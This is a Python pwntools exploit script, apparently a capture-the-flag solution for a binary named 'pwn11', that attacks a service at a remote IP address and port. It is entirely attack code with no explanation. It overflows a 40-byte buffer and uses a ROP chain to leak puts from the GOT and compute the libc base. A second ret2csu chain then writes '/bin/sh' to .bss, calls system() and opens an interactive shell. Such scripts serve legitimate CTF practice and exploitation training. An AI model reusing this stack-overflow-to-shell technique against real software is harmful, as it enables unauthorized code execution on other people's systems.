from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn11")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.33.164.4",50011)
    libc=ELF("libc-2.19.so")
def debug():
    gdb.attach(a,'''
    b *(0x00000000040124B)
    ''')
def init():
    a.recvuntil("please input your name\n")
    a.sendline("A")
    a.recvuntil(" game,can you guess the key?\n")
#debug()
init()
elf=ELF("./pwn11")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
pop_rdi_ret=0x00000000004012ab
payload='A'*40
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(0x000000000401080)
a.sendline(payload)
a.recvuntil("ail!\n")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
print hex(libc_base)
init()
system_addr=libc.symbols["system"]+libc_base
bin_sh=libc_base+next(libc.search("/bin/sh"))
payload='A'*40
payload+=p64(0x0000000004012A2)
payload+=p64(0)
payload+=p64(1)
payload+=p64(elf.got["read"])
payload+=p64(0)
payload+=p64(elf.bss()+0x100)
payload+=p64(0x100)
payload+=p64(0x000000000401288)
payload+='A'*56
payload+=p64(pop_rdi_ret)
payload+=p64(elf.bss()+0x100)
payload+=p64(system_addr)
a.sendline(payload)
sleep(0.5)
a.sendline("/bin/sh\x00")
a.interactive()